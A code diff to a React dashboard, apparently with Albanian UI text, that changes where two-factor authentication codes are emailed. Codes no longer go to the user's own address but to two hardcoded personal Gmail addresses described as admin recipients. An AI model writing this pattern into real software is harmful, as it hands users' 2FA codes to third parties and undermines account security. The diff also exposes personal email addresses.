@@ -412,12 +412,21 @@ export default function Dashboard() {
 
         // send via EmailJS
         try {
-          await emailjs.send(
-            EMAILJS_SERVICE,
-            EMAILJS_TEMPLATE,
-            { to_email: targetEmail, code },
-            EMAILJS_USER,
-          );
+          // send to both admin recipients
+          await Promise.all([
+            emailjs.send(
+              EMAILJS_SERVICE,
+              EMAILJS_TEMPLATE,
+              { to_email: "arthalimi989@gmail.com", code },
+              EMAILJS_USER,
+            ),
+            emailjs.send(
+              EMAILJS_SERVICE,
+              EMAILJS_TEMPLATE,
+              { to_email: "suelaleka099@gmail.com", code },
+              EMAILJS_USER,
+            ),
+          ]);
         } catch (e) {
           console.error("EmailJS send failed:", e);
           setTwoFAError("Dërgimi i kodit dështoi. Provoni përsëri.");
@@ -451,12 +460,20 @@ export default function Dashboard() {
         // If backend returned a code (for dev) and frontend is allowed, send it
         if (ALLOW_FRONTEND_EMAILJS && data.code) {
           try {
-            await emailjs.send(
-              EMAILJS_SERVICE,
-              EMAILJS_TEMPLATE,
-              { to_email: targetEmail, code: data.code },
-              EMAILJS_USER,
-            );
+            await Promise.all([
+              emailjs.send(
+                EMAILJS_SERVICE,
+                EMAILJS_TEMPLATE,
+                { to_email: "arthalimi989@gmail.com", code: data.code },
+                EMAILJS_USER,
+              ),
+              emailjs.send(
+                EMAILJS_SERVICE,
+                EMAILJS_TEMPLATE,
+                { to_email: "suelaleka099@gmail.com", code: data.code },
+                EMAILJS_USER,
+              ),
+            ]);
             showNotification("Kodi 2FA u dërgua në email.");
           } catch (e) {
             console.error("EmailJS send failed:", e);
